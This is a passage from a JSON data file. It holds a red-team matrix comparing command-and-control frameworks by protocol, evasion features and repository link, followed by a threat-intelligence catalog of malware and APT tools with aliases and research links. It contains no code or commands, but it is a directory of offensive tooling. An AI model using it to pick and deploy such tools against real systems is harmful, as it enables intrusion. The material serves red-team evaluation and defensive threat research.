"No", "macOS": "No", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "AES", "Stego": "No", "Proxy Aware": "Yes", "DomainFront": "No", "Custom Profile": "Yes", "Jitter": "No", "Working Hours": "No", "Kill Date": "No", "Chaining": "No", "Logging": "Yes", "ATT&CK Mapping": "No", "Dashboard": "No", "NetWitness": "Yes", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "4", "Notes": "Built on top of leaked MuddyC3"}, "Nuages": {"Name": "Nuages", "License": "NA", "Price": "NA", "GitHub": "https://github.com/p3nt4/Nuages", "Site": "", "Twitter": "", "Evaluator": "@jorgeorchilles", "Date": "11/12/2019", "Version": "POC", "Implementation": "setup.sh", "How-To": "Yes", "Slingshot": "", "Kali": "", "Server": "Python", "Agent": "C#", "Multi-User": "Yes", "UI": "GUI", "API": "Yes", "Windows": "Yes", "Linux": "No", "macOS": "No", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "AES", "Stego": "No", "Proxy Aware": "No", "DomainFront": "No", "Custom Profile": "No", "Jitter": "No", "Working Hours": "No", "Kill Date": "No", "Chaining": "No", "Logging": "No", "ATT&CK Mapping": "No", "Dashboard": "No", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "0", "Notes": "Everything is custom built."}, "Octopus": {"Name": "Octopus", "License": "GNU GPL3", "Price": "NA", "GitHub": "https://github.com/mhaskar/Octopus", "Site": "https://shells.systems/unveiling-octopus-the-pre-operation-c2-for-red-teamers/", "Twitter": "@mohammadaskar2", "Evaluator": "@jorgeorchilles", "Date": "12/12/12019", "Version": "v1.0 Beta", "Implementation": "pip3", "How-To": "", "Slingshot": "", "Kali": "", "Server": "Python", "Agent": "PowerShell", "Multi-User": "No", "UI": "GUI", "API": "No", "Windows": "Yes", "Linux": "No", "macOS": "No", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "AES", "Stego": "No", "Proxy Aware": "No", "DomainFront": "No", "Custom Profile": "Yes", "Jitter": "No", "Working Hours": "No", "Kill Date": "No", "Chaining": "No", "Logging": "No", "ATT&CK Mapping": "Yes", "Dashboard": "No", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "3", "Notes": ""}, "PoshC2": {"Name": "PoshC2", "License": "BSD3", "Price": "NA", "GitHub": "https://github.com/nettitude/PoshC2/", "Site": "https://poshc2.readthedocs.io/en/latest/", "Twitter": "@Nettitude_Labs", "Evaluator": "@jorgeorchilles", "Date": "11/13/2019", "Version": "5", "Implementation": "install.sh", "How-To": "", "Slingshot": "", "Kali": "Yes", "Server": "Python", "Agent": "PowerShell/C#/Python", "Multi-User": "Yes", "UI": "CLI", "API": "No", "Windows": "Yes", "Linux": "Yes", "macOS": "Yes", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "TLS", "Stego": "No", "Proxy Aware": "Yes", "DomainFront": "Yes", "Custom Profile": "Yes", "Jitter": "Yes", "Working Hours": "No", "Kill Date": "Yes", "Chaining": "Yes", "Logging": "Yes", "ATT&CK Mapping": "Yes", "Dashboard": "No", "NetWitness": "Yes", "Actively Maint.": "Yes", "Slack": "poshc2.slack.com", "Slack Members": "NA", "GH Issues": "44", "Notes": ""}, "PowerHub": {"Name": "PowerHub", "License": "MIT", "Price": "NA", "GitHub": "https://github.com/AdrianVollmer/PowerHub", "Site": "", "Twitter": "@mr_mitm", "Evaluator": "@jorgeorchilles", "Date": "11/15/2019", "Version": "1.3", "Implementation": "pip3", "How-To": "Yes", "Slingshot": "", "Kali": "Yes", "Server": "Python", "Agent": "PowerShell", "Multi-User": "Yes", "UI": "Web", "API": "No", "Windows": "Yes", "Linux": "No", "macOS": "No", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "TLS", "Stego": "No", "Proxy Aware": "Yes", "DomainFront": "No", "Custom Profile": "No", "Jitter": "No", "Working Hours": "No", "Kill Date": "No", "Chaining": "No", "Logging": "Yes", "ATT&CK Mapping": "No", "Dashboard": "No", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "38", "Notes": ""}, "Prismatica": {"Name": "Prismatica", "License": "MIT", "Price": "NA", "GitHub": "https://github.com/Project-Prismatica", "Site": "http://prismatica.io/", "Twitter": "@PPrismatica", "Evaluator": "@0sm0s1z", "Date": "11/13/2019", "Version": "0.01", "Implementation": "Docker", "How-To": "", "Slingshot": "", "Kali": "", "Server": "Javascript/Python", "Agent": "JScript/.NET/Rust", "Multi-User": "Yes", "UI": "GUI", "API": "Yes", "Windows": "Yes", "Linux": "Yes", "macOS": "Yes", "TCP": "Yes", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "None", "Stego": "No", "Proxy Aware": "Yes", "DomainFront": "No", "Custom Profile": "Yes", "Jitter": "Yes", "Working Hours": "No", "Kill Date": "No", "Chaining": "Yes", "Logging": "Yes", "ATT&CK Mapping": "No", "Dashboard": "Yes", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "1", "Notes": ""}, "Proton": {"Name": "Proton", "License": "GNU GPL3", "Price": "NA", "GitHub": "https://github.com/entynetproject/proton", "Site": "", "Twitter": "@enty8080", "Evaluator": "", "Date": "", "Version": "5", "Implementation": "install.sh", "How-To": "", "Slingshot": "", "Kali": "", "Server": "Python", "Agent": "JScript/VBScript", "Multi-User": "", "UI": "", "API": "", "Windows": "", "Linux": "", "macOS": "", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "", "Key Exchange": "", "Stego": "", "Proxy Aware": "", "DomainFront": "", "Custom Profile": "", "Jitter": "", "Working Hours": "", "Kill Date": "", "Chaining": "", "Logging": "", "ATT&CK Mapping": "No", "Dashboard": "", "NetWitness": "", "Actively Maint.": "", "Slack": "No", "Slack Members": "NA", "GH Issues": "4", "Notes": ""}, "Pupy": {"Name": "Pupy", "License": "BSD3", "Price": "NA", "GitHub": "https://github.com/n1nj4sec/pupy", "Site": "", "Twitter": "@n1nj4sec", "Evaluator": "", "Date": "", "Version": "", "Implementation": "", "How-To": "", "Slingshot": "", "Kali": "", "Server": "Python", "Agent": "Python", "Multi-User": "No", "UI": "CLI", "API": "No", "Windows": "", "Linux": "", "macOS": "", "TCP": "", "HTTP": "", "HTTP2": "", "HTTP3": "", "DNS": "", "DoH": "", "ICMP": "", "FTP": "", "IMAP": "", "MAPI": "", "SMB": "", "Key Exchange": "", "Stego": "", "Proxy Aware": "", "DomainFront": "", "Custom Profile": "", "Jitter": "", "Working Hours": "", "Kill Date": "", "Chaining": "", "Logging": "", "ATT&CK Mapping": "Yes", "Dashboard": "", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "596", "Notes": ""}, "QuasarRAT": {"Name": "QuasarRAT", "License": "MIT", "Price": "NA", "GitHub": "https://github.com/quasar/QuasarRAT", "Site": "", "Twitter": "", "Evaluator": "", "Date": "", "Version": "", "Implementation": "", "How-To": "", "Slingshot": "", "Kali": "", "Server": "", "Agent": "", "Multi-User": "", "UI": "", "API": "", "Windows": "", "Linux": "", "macOS": "", "TCP": "", "HTTP": "", "HTTP2": "", "HTTP3": "", "DNS": "", "DoH": "", "ICMP": "", "FTP": "", "IMAP": "", "MAPI": "", "SMB": "", "Key Exchange": "", "Stego": "", "Proxy Aware": "", "DomainFront": "", "Custom Profile": "", "Jitter": "", "Working Hours": "", "Kill Date": "", "Chaining": "", "Logging": "", "ATT&CK Mapping": "Yes", "Dashboard": "", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "529", "Notes": ""}, "Red Team Toolkit": {"Name": "Red Team Toolkit", "License": "Commercial", "Price": "$7,000", "GitHub": "", "Site": "https://silentbreaksecurity.com/red-team-toolkit/slingshot/", "Twitter": "@SilentBreakSec", "Evaluator": "@dmay3r", "Date": "11/22/2019", "Version": "2.63", "Implementation": "install.sh", "How-To": "", "Slingshot": "", "Kali": "", "Server": "Python", "Agent": "C++", "Multi-User": "No", "UI": "CLI", "API": "No", "Windows": "Yes", "Linux": "No", "macOS": "No", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "Yes", "Key Exchange": "Encrypted Key Exchange", "Stego": "No", "Proxy Aware": "Yes", "DomainFront": "Yes", "Custom Profile": "Yes", "Jitter": "No", "Working Hours": "No", "Kill Date": "No", "Chaining": "Yes", "Logging": "Yes", "ATT&CK Mapping": "No", "Dashboard": "No", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "NA", "Notes": ""}, "redViper": {"Name": "redViper", "License": "NA", "Price": "NA", "GitHub": "https://github.com/itsKindred/redViper", "Site": "", "Twitter": "", "Evaluator": "", "Date": "", "Version": "", "Implementation": "", "How-To": "", "Slingshot": "", "Kali": "", "Server": "", "Agent": "", "Multi-User": "", "UI": "", "API": "", "Windows": "", "Linux": "", "macOS": "", "TCP": "", "HTTP": "", "HTTP2": "", "HTTP3": "", "DNS": "", "DoH": "", "ICMP": "", "FTP": "", "IMAP": "", "MAPI": "", "SMB": "", "Key Exchange": "", "Stego": "", "Proxy Aware": "", "DomainFront": "", "Custom Profile": "", "Jitter": "", "Working Hours": "", "Kill Date": "", "Chaining": "", "Logging": "", "ATT&CK Mapping": "No", "Dashboard": "", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "0", "Notes": ""}, "ReverseTCPShell": {"Name": "ReverseTCPShell", "License": "NA", "Price": "NA", "GitHub": "https://github.com/ZHacker13/ReverseTCPShell", "Site": "", "Twitter": "@ZHacker13", "Evaluator": "@jorgeorchilles", "Date": "12/19/2019", "Version": "NA", "Implementation": "PowerShell", "How-To": "", "Slingshot": "", "Kali": "", "Server": "PowerShell", "Agent": "PowerShell", "Multi-User": "No", "UI": "CLI", "API": "No", "Windows": "Yes", "Linux": "No", "macOS": "No", "TCP": "Yes", "HTTP": "No", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "None", "Stego": "No", "Proxy Aware": "No", "DomainFront": "No", "Custom Profile": "No", "Jitter": "No", "Working Hours": "No", "Kill Date": "No", "Chaining": "No", "Logging": "No", "ATT&CK Mapping": "No", "Dashboard": "No", "NetWitness": "Yes", "Actively Maint.": "No", "Slack": "No", "Slack Members": "NA", "GH Issues": "0", "Notes": "Direct, constant TCP connection"}, "SCYTHE": {"Name": "SCYTHE", "License": "Commercial", "Price": "Contact Sales", "GitHub": "", "Site": "https://scythe.io", "Twitter": "@scythe_io", "Evaluator": "@Adam_Mashinchi", "Date": "11/13/2019", "Version": "2.5", "Implementation": "Binary", "How-To": "", "Slingshot": "", "Kali": "", "Server": "Python", "Agent": "C", "Multi-User": "Yes", "UI": "Web", "API": "Yes", "Windows": "Yes", "Linux": "Yes", "macOS": "Yes", "TCP": "Yes", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "Yes", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "Yes", "Key Exchange": "Curve25519", "Stego": "Yes", "Proxy Aware": "Yes", "DomainFront": "Yes", "Custom Profile": "Yes", "Jitter": "Yes", "Working Hours": "No", "Kill Date": "Yes", "Chaining": "Yes", "Logging": "Yes", "ATT&CK Mapping": "No", "Dashboard": "Yes", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "NA", "Notes": ""}, "SilentTrinity": {"Name": "SilentTrinity", "License": "GNU GPL3", "Price": "NA", "GitHub": "https://github.com/byt3bl33d3r/SILENTTRINITY", "Site": "", "Twitter": "@byt3bl33d3r", "Evaluator": "@0sm0s1z", "Date": "11/13/2019", "Version": "0.4.6dev", "Implementation": "Binary", "How-To": "Yes", "Slingshot": "Yes", "Kali": "Yes", "Server": "Python", "Agent": "Boolang", "Multi-User": "Yes", "UI": "CLI", "API": "No", "Windows": "Yes", "Linux": "No", "macOS": "No", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "ECDHE", "Stego": "No", "Proxy Aware": "No", "DomainFront": "Yes", "Custom Profile": "No", "Jitter": "Yes", "Working Hours": "No", "Kill Date": "No", "Chaining": "No", "Logging": "Yes", "ATT&CK Mapping": "No", "Dashboard": "No", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "#silenttrinity bloodhoundhq.slack.com", "Slack Members": "489", "GH Issues": "67", "Notes": ""}, "SK8PARK/RAT": {"Name": "SK8PARK/RAT", "License": "NA", "Price": "", "GitHub": "https://github.com/slyd0g/", "Site": "", "Twitter": "@slyd0g", "Evaluator": "", "Date": "", "Version": "", "Implementation": "", "How-To": "Yes", "Slingshot": "", "Kali": "", "Server": "Python", "Agent": "C++", "Multi-User": "", "UI": "", "API": "Yes", "Windows": "", "Linux": "", "macOS": "", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "Encrypted Key Exchange", "Stego": "No", "Proxy Aware": "", "DomainFront": "", "Custom Profile": "", "Jitter": "Yes", "Working Hours": "", "Kill Date": "", "Chaining": "", "Logging": "", "ATT&CK Mapping": "No", "Dashboard": "", "NetWitness": "", "Actively Maint.": "No", "Slack": "No", "Slack Members": "NA", "GH Issues": "0", "Notes": "SK8PARK is server and SK8RAT is implant"}, "Sliver": {"Name": "Sliver", "License": "GNU GPL3", "Price": "NA", "GitHub": "https://github.com/BishopFox/sliver", "Site": "", "Twitter": "@LittleJoeTables @rkervell @bishopfox", "Evaluator": "@jorgeorchilles", "Date": "11/5/2019", "Version": "0.0.6", "Implementation": "Binary", "How-To": "Yes", "Slingshot": "Yes", "Kali": "Yes", "Server": "Go", "Agent": "Go", "Multi-User": "Yes", "UI": "CLI", "API": "No", "Windows": "Yes", "Linux": "Yes", "macOS": "Yes", "TCP": "Yes", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "Yes", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "mTLS", "Stego": "No", "Proxy Aware": "No", "DomainFront": "No", "Custom Profile": "No", "Jitter": "No", "Working Hours": "No", "Kill Date": "No", "Chaining": "No", "Logging": "No", "ATT&CK Mapping": "No", "Dashboard": "No", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "131", "Notes": "Good for evasion"}, "Throwback": {"Name": "Throwback", "License": "GNU GPL2", "Price": "NA", "GitHub": "https://github.com/silentbreaksec/Throwback", "Site": "", "Twitter": "@SilentBreakSec", "Evaluator": "@malcomvetter", "Date": "2/24/2020", "Version": "Aug 2017", "Implementation": "shell script", "How-To": "Yes", "Slingshot": "", "Kali": "", "Server": "php", "Agent": "C++", "Multi-User": "Yes", "UI": "Web", "API": "No", "Windows": "Yes", "Linux": "No", "macOS": "No", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "RC4", "Stego": "No", "Proxy Aware": "Yes", "DomainFront": "No", "Custom Profile": "No", "Jitter": "No", "Working Hours": "No", "Kill Date": "No", "Chaining": "No", "Logging": "No", "ATT&CK Mapping": "No", "Dashboard": "Yes", "NetWitness": "Yes", "Actively Maint.": "No", "Slack": "No", "Slack Members": "NA", "GH Issues": "1", "Notes": "No updates in 5 years; web UI not authenticated"}, "Trevor C2": {"Name": "Trevor C2", "License": "BSD3", "Price": "NA", "GitHub": "https://github.com/trustedsec/trevorc2/", "Site": "", "Twitter": "@HackingDave", "Evaluator": "@cabbagesalad2", "Date": "10/16/2019", "Version": "1.1", "Implementation": "pip3", "How-To": "Yes", "Slingshot": "", "Kali": "", "Server": "Python", "Agent": "Python/PowerShell", "Multi-User": "No", "UI": "CLI", "API": "No", "Windows": "Yes", "Linux": "Yes", "macOS": "Yes", "TCP": "No", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "AES", "Stego": "No", "Proxy Aware": "No", "DomainFront": "No", "Custom Profile": "Yes", "Jitter": "Yes", "Working Hours": "No", "Kill Date": "No", "Chaining": "No", "Logging": "No", "ATT&CK Mapping": "No", "Dashboard": "No", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "5", "Notes": ""}, "Void-RAT": {"Name": "Void-RAT", "License": "NA", "Price": "", "GitHub": "https://github.com/KadeDev/Void-RAT", "Site": "", "Twitter": "", "Evaluator": "", "Date": "", "Version": "", "Implementation": "", "How-To": "", "Slingshot": "", "Kali": "", "Server": "", "Agent": "", "Multi-User": "", "UI": "", "API": "", "Windows": "", "Linux": "", "macOS": "", "TCP": "", "HTTP": "", "HTTP2": "", "HTTP3": "", "DNS": "", "DoH": "", "ICMP": "", "FTP": "", "IMAP": "", "MAPI": "", "SMB": "", "Key Exchange": "", "Stego": "", "Proxy Aware": "", "DomainFront": "", "Custom Profile": "", "Jitter": "", "Working Hours": "", "Kill Date": "", "Chaining": "", "Logging": "", "ATT&CK Mapping": "", "Dashboard": "", "NetWitness": "", "Actively Maint.": "No", "Slack": "No", "Slack Members": "NA", "GH Issues": "", "Notes": ""}, "Voodoo": {"Name": "Voodoo", "License": "Commercial", "Price": "$2,000", "GitHub": "", "Site": "https://www.voodooops.com/", "Twitter": "@professor__plum", "Evaluator": "@kevinlustic", "Date": "2/12/2020", "Version": "0.2.3", "Implementation": "run.py", "How-To": "", "Slingshot": "", "Kali": "", "Server": "Python", "Agent": "C++", "Multi-User": "Yes", "UI": "Web", "API": "No", "Windows": "Yes", "Linux": "Yes", "macOS": "Yes", "TCP": "Yes", "HTTP": "Yes", "HTTP2": "No", "HTTP3": "No", "DNS": "No", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "TLS + ChaCha20-Poly1305", "Stego": "No", "Proxy Aware": "Yes", "DomainFront": "No", "Custom Profile": "No", "Jitter": "Yes", "Working Hours": "No", "Kill Date": "Yes", "Chaining": "Yes", "Logging": "Yes", "ATT&CK Mapping": "No", "Dashboard": "No", "NetWitness": "", "Actively Maint.": "Yes", "Slack": "s2universe.slack.com", "Slack Members": "189", "GH Issues": "NA", "Notes": "Community edition available for evaluation and linked off the main site"}, "WEASEL": {"Name": "WEASEL", "License": "MIT", "Price": "NA", "GitHub": "https://github.com/facebookincubator/WEASEL", "Site": "", "Twitter": "@ucsenoi", "Evaluator": "@jorgeorchilles", "Date": "12/3/2019", "Version": "1", "Implementation": "pip3", "How-To": "", "Slingshot": "", "Kali": "", "Server": "Python", "Agent": "Python", "Multi-User": "No", "UI": "CLI", "API": "No", "Windows": "Yes", "Linux": "Yes", "macOS": "Yes", "TCP": "No", "HTTP": "No", "HTTP2": "No", "HTTP3": "No", "DNS": "Yes", "DoH": "No", "ICMP": "No", "FTP": "No", "IMAP": "No", "MAPI": "No", "SMB": "No", "Key Exchange": "AES", "Stego": "No", "Proxy Aware": "No", "DomainFront": "No", "Custom Profile": "No", "Jitter": "No", "Working Hours": "No", "Kill Date": "No", "Chaining": "No", "Logging": "No", "ATT&CK Mapping": "No", "Dashboard": "No", "NetWitness": "Yes", "Actively Maint.": "Yes", "Slack": "No", "Slack Members": "NA", "GH Issues": "3", "Notes": "Beacons via DNS"}}, "tools": {"tools": [{"names": ["Gh0st RAT", "Moudoor", "Piano Gh0st", "Zegost"], "family": [], "comments": null, "links": ["https://cysinfo.com/hunting-and-decrypting-communications-of-gh0st-rat-in-memory/", "http://researchcenter.paloaltonetworks.com/2015/09/musical-chairs-multi-year-campaign-involving-new-variant-of-gh0st-malware/", "https://sentinelone.com/blogs/the-curious-case-of-gh0st-malware/", "http://download01.norman.no/documents/ThemanyfacesofGh0stRat.pdf"]}, {"names": ["Poison Ivy", "Darkmoon", "PIVY"], "family": [], "comments": null, "links": ["http://www.fireeye.com/resources/pdfs/fireeye-poison-ivy-report.pdf"]}, {"names": ["HydraQ", "9002 RAT", "McRAT", "Naid", "BKDR_MDMBOT"], "family": [], "comments": null, "links": ["http://cybercampaigns.net/wp-content/uploads/2013/05/Hydraq.pdf", "https://cysinfo.com/hunting-apt-rat-9002-in-memory-using-volatility-plugin/"]}, {"names": ["Hikit", "Matrix RAT", "Gaolmay"], "family": [], "comments": null, "links": []}, {"names": ["Zxshell", "Sensode"], "family": [], "comments": null, "links": ["http://pastebin.com/jCaLHvkM", "https://blogs.cisco.com/security/talos/opening-zxshell"]}, {"names": ["DeputyDog", "Fexel"], "family": [], "comments": null, "links": []}, {"names": ["PlugX", "Destory RAT", "Thoper", "Sogu", "Korplug", "Kaba"], "family": ["PlugX"], "comments": "Often uses DLL side-loading", "links": ["http://blogs.cisco.com/security/talos/threat-spotlight-group-72", "https://www.circl.lu/pub/tr-24/", "http://labs.lastline.com/an-analysis-of-plugx"]}, {"names": ["BACKSPACe", "Lecna", "BARYS"], "family": [], "comments": null, "links": []}, {"names": ["Regin", "Prax", "WarriorPride", "QUERTY"], "family": [], "comments": "FEYES malware", "links": []}, {"names": ["HttpBrowser", "TokenControl"], "family": [], "comments": null, "links": []}, {"names": ["NetTraveler", "TravNet", "RedStar", "Netfile"], "family": [], "comments": null, "links": []}, {"names": ["IceFog", "Fucobha"], "family": [], "comments": null, "links": ["https://web.archive.org/web/20160825001253/http://www.kaspersky.com/about/news/virus/2013/Kaspersky_Lab_exposes_Icefog_a_new_cyber-espionage_campaign_focusing_on_supply_chain_attacks", "https://securelist.com/blog/research/57331/the-icefog-apt-a-tale-of-cloak-and-three-daggers/"]}, {"names": ["HTran", "CTran", "ONHAT (similar)", "Xdoor"], "family": [], "comments": "Chinese Tunneling Tool", "links": ["http://www.secureworks.com/cyber-threat-intelligence/threats/htran/"]}, {"names": ["Agent.BTZ", "SillyFDC"], "family": [], "comments": null, "links": ["http://cybercampaigns.net/wp-content/uploads/2013/05/Agent-BTZ.pdf"]}, {"names": ["Comfoo"], "family": [], "comments": "RSA incident, Red October", "links": ["http://www.secureworks.com/cyber-threat-intelligence/threats/secrets-of-the-comfoo-masters/"]}, {"names": ["DNSChanger", "RSPlug"], "family": ["ZLob"], "comments": null, "links": ["http://www.secureworks.com/cyber-threat-intelligence/threats/secrets-of-the-comfoo-masters/"]}, {"names": ["IEXPLORE RAT", "Sharky RAT", "Briba", "Comfoo"], "family": [], "comments": null, "links": ["https://citizenlab.org/2012/09/citizen-lab-technical-brief-iexpl0re-rat/", "https://www.secureworks.com/research/secrets-of-the-comfoo-masters", "https://www.symantec.com/security_response/writeup.jsp?docid=2012-051515-2843-99&tabid=2"]}, {"names": ["LSB"], "family": [], "comments": null, "links": ["https://github.com/RobinDavid/LSB-Steganography", "http://ijact.org/volume3issue4/IJ0340004.pdf"]}, {"names": ["LStudio", "Emissary", "Elise"], "family": [], "comments": null, "links": ["http://researchcenter.paloaltonetworks.com/2015/12/attack-on-french-diplomat-linked-to-operation-lotus-blossom/"]}, {"names": ["MNKit", "WingD", "Tran Duy Linh"], "family": [], "comments": null, "links": ["http://researchcenter.paloaltonetworks.com/2016/01/scarlet-mimic-years-long-espionage-targets-minority-activists/"]}, {"names": ["Derusbi", "Photo", "Shyape", "Sakula (variant)", "Mivast"], "family": ["Derusbi"], "comments": "Chinese Backdoor, Winnti", "links": ["https://www.rsaconference.com/writable/presentations/file_upload/crwd-t11-hide_and_seek-how_threat_actors_respond_in_the_face_of_public_exposure.pdf", "https://www.rsaconference.com/writable/presentations/file_upload/hta-w02-dissecting-derusbi.pdf"]}, {"names": ["Wipbot", "Epic", "Tavdig"], "family": [], "comments": null, "links": []}, {"names": ["Carbon Rootkit", "Snake Rootkit", "Cobra"], "family": [], "comments": null, "links": []}, {"names": ["Turla", "Uroburos"], "family": [], "comments": null, "links": []}, {"names": ["Winnti (Network Driver Component)", "Derusbi", "HIGHNOON", "Rbdoor"], "family": [], "comments": "P2P Backdoor, Driver loaded into memory", "links": ["https://securelist.com/?s=winnti", "http://blog.vsec.com.vn/apt/initial-winnti-analysis-against-vietnam-game-company.html#more-73"]}, {"names": ["WCE", "AceHash"], "family": [], "comments": "Password Dumper, PTH", "links": ["http://www.ampliasecurity.com/research/windows-credentials-editor/"]}, {"names": ["Mimikatz", "Powerkatz"], "family": [], "comments": "Password Dumper, PTH, DCSync, SkeletonKey, Golden/Silver Tickets", "links": ["https://github.com/gentilkiwi/mimikatz"]}, {"names": ["HDRoot", "HDD Rootkit"], "family": [], "comments": "Winnti / Axiom Group", "links": ["http://williamshowalter.com/a-universal-windows-bootkit/"]}, {"names": ["OrcaRAT", "LeoUnica"], "family": [], "comments": "Found with Comfoo malware", "links": ["http://pwc.blogs.com/cyber_security_updates/2014/10/orcarat-a-whale-of-a-tale.html", "https://github.com/kbandla/APTnotes/blob/master/2014/LeoUncia_OrcaRat.pdf"]}, {"names": ["Etumbot"], "family": [], "comments": "Assocaited with Numbered Panda/APT12", "links": ["https://cysinfo.com/sx-2nd-meetup-reversing-and-decrypting-the-communications-of-apt-malware/", "https://www.arbornetworks.com/blog/asert/illuminating-the-etumbot-apt-backdoor/"]}, {"names": ["xcmd"], "family": [], "comments": "Similar to psexec. Used in OPM and Anthem breaches", "links": []}, {"names": ["NjRAT"], "family": [], "comments": null, "links": []}, {"names": ["X-Agent", "Fysbis", "CHOPSTICK", "Backdoor.SofacyX", "SPLM"], "family": [], "comments": "Used by Sofacy group, Linux backdoor", "links": ["http://www.welivesecurity.com/2016/10/25/lifting-lid-sednit-closer-look-software-uses/"]}, {"names": ["Adwind RAT", "Frutas", "jFrutas", "AlienSpy", "Unrecom", "jSocket", "jRAT"], "family": ["Adwind"], "comments": null, "links": ["https://t.co/x0jmdEp45w"]}, {"names": ["Jiripbot", "Flacher"], "family": [], "comments": "Wild Neutron", "links": []}, {"names": ["Quasar RAT"], "family": [], "comments": null, "links": ["https://github.com/quasar/QuasarRAT/tree/v1.2.0.0"]}, {"names": ["Mtool", "MultiTool"], "family": [], "comments": "Cn Group Tool for Recon", "links": []}, {"names": ["FallChill", "Manuscrypt "], "family": [], "comments": "Backdoor. Used by Lazarus Group, Bluenoroff.", "links": ["https://securelist.com/apt-trends-report-q2-2017/79332/"]}, {"names": ["Infy", "Infy M"], "family": [], "comments": null, "links": ["https://researchcenter.paloaltonetworks.com/2016/05/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/"]}, {"names": ["DustySky", "NeD Worm"], "family": [], "comments": null, "links": ["http://www.clearskysec.com/dustysky/"]}, {"names": ["Exforel"], "family": [], "comments": "SIG30 in NSA report, Chinese origin", "links": ["https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=VirTool:WinNT/Exforel.A", "https://blog.crysys.hu/2018/03/territorial-dispute-nsas-perspective-on-apt-landscape/"]}, {"names": ["LoJax"], "family": [], "comments": null, "links": []}, {"names": ["ROKRAT"], "family": [], "comments": null, "links": ["https://blog.talosintelligence.com/2018/01/korea-in-crosshairs.html", "http://v3lo.tistory.com/24"]}, {"names": ["Ryuk", "Hermes"], "family": [], "comments": "Ryuk based on Hermes GRIM SPIDER (cybercrime)", "links": ["https://research.checkpoint.com/ryuk-ransomware-targeted-campaign-break/", "https://blog.kryptoslogic.com/malware/2019/01/10/dprk-emotet.html", "https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/ryuk-ransomware-attack-rush-to-attribution-misses-the-point/", "https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/ryuk-exploring-the-human-connection/"]}, {"names": ["Xtunnel", "X-Tunnel", "Shunnael", "XAP"], "family": [], "comments": "Used by APT28 / Sofacy, A family of modular backdoors with Windows, Linux, and iOS variants. The malware,which includes espionage functionalities like keystroke logging and file exfiltration, is typically dropped after a reconnaissance phase as second-stage malware.", "links": []}, {"names": ["Flame", "Flamer", "sKyWIper"], "family": [], "comments": "Used by GOSSIPGIRL (umbrella group)", "links": ["https://medium.com/chronicle-blog/who-is-gossipgirl-3b4170f846c0"]}, {"names": 